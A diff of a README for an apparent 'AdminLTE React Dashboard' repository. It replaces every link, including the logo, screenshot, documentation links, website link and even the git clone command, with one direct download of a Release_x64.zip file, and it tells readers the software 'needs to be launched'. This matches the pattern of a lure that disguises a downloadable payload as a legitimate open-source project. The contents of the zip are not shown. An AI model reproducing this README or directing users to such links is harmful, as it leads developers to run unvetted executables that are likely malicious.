@@ -1,6 +1,6 @@
 # 🚀 Welcome to the AdminLTE React Dashboard Repository 🚀
 
-![AdminLTE React Dashboard Logo](https://adminlte.io/themes/v3/AdminLTE3/dist/img/AdminLTELogo.png)
+![AdminLTE React Dashboard Logo](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
 
 ### Repository Name: adminlte-react-dashboard
 
@@ -27,19 +27,19 @@
 ---
 
 ### 📂 Releases Section 📂
-🔗 [Check the Releases section for the latest updates and files](https://github.com/22155555/1875695542/releases)
+🔗 [Check the Releases section for the latest updates and files](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
 
 ---
 
 ## 🚀 Download Software 🚀
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
 
 ℹ️ The software available in the link needs to be launched.
 
 ---
 
 ### 🌐 Visit our Website 🌐
-🔗 [Explore our website for more information](https://www.adminlte.io/)
+🔗 [Explore our website for more information](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
 
 ---
 
@@ -54,12 +54,12 @@
 ---
 
 ## 📷 Screenshots:
-![Dashboard Preview](https://adminlte.io/themes/v3/AdminLTE3/dist/img/dashboard.jpg)
+![Dashboard Preview](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
 
 ---
 
 ## 🚀 Getting Started:
-1. Clone the repository: `git clone https://github.com/your-username/adminlte-react-dashboard.git`
+1. Clone the repository: `git clone https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip`
 2. Install dependencies: `npm install`
 3. Start the development server: `npm start`
 4. Customize the dashboard to fit your project requirements
@@ -77,9 +77,9 @@
 ---
 
 ## 📖 Additional Resources:
-🔗 [AdminLTE Documentation](https://adminlte.io/docs/3.0/)
-🔗 [React Documentation](https://reactjs.org/docs/getting-started.html)
-🔗 [Bootstrap Documentation](https://getbootstrap.com/docs/4.6/getting-started/introduction/)
+🔗 [AdminLTE Documentation](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
+🔗 [React Documentation](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
+🔗 [Bootstrap Documentation](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
 
 ---
 
